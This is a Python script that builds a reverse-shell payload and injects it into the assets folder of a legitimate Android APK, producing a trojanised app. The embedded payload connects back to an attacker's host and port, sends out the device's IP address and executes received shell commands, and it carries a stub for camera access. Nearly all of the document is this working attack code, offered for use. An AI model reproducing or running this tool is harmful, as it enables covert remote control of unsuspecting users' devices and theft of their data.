import os
import argparse
import zipfile
import shutil

def create_payload(lhost, lport, output):
    payload_content = f"""
import socket
import os
import subprocess

def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def connect_back(lhost, lport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    ip = get_ip()
    s.send(ip.encode('utf-8'))
    while True:
        command = s.recv(4096).decode('utf-8')
        if command.lower() == "exit":
            break
        elif command.startswith("cd "):
            try:
                os.chdir(command[3:])
                s.send(b"Changed directory")
            except FileNotFoundError as e:
                s.send(str(e).encode('utf-8'))
        elif command == "camera":
            # Kamera eri≈üim kodu buraya eklenecek
            s.send(b"Camera access is not implemented")
        else:
            output = subprocess.getoutput(command)
            s.send(output.encode('utf-8'))
    s.close()

if __name__ == "__main__":
    lhost = "{lhost}"
    lport = {lport}
    connect_back(lhost, lport)
"""
    with open(output, 'w') as payload_file:
        payload_file.write(payload_content)
    print(f"Payload created and saved as {output}")

def create_apk_with_payload(original_apk, payload_file, output_apk):
    temp_dir = "temp_apk"

    with zipfile.ZipFile(original_apk, 'r') as zip_ref:
        zip_ref.extractall(temp_dir)

    assets_dir = os.path.join(temp_dir, 'assets')
    if not os.path.exists(assets_dir):
        os.makedirs(assets_dir)
    shutil.copy(payload_file, os.path.join(assets_dir, 'payload.py'))

    with zipfile.ZipFile(output_apk, 'w') as new_zip:
        for folder_name, subfolders, filenames in os.walk(temp_dir):
            for filename in filenames:
                file_path = os.path.join(folder_name, filename)
                arcname = os.path.relpath(file_path, temp_dir)
                new_zip.write(file_path, arcname)

    shutil.rmtree(temp_dir)
    print(f"Payload injected and new APK saved as {output_apk}")

def main():
    parser = argparse.ArgumentParser(description="Create and inject payload into APK.")
    parser.add_argument("--lhost", required=True, help="LHOST (your IP address)")
    parser.add_argument("--lport", required=True, help="LPORT (your port)")
    parser.add_argument("--original-apk", required=True, help="Path to the original APK file")
    parser.add_argument("--output-apk", required=True, help="Path for the output APK file")

    args = parser.parse_args()

    output_payload = "payload.py"

    create_payload(args.lhost, args.lport, output_payload)
    create_apk_with_payload(args.original_apk, output_payload, args.output_apk)

    os.remove(output_payload)

if __name__ == "__main__":
    main()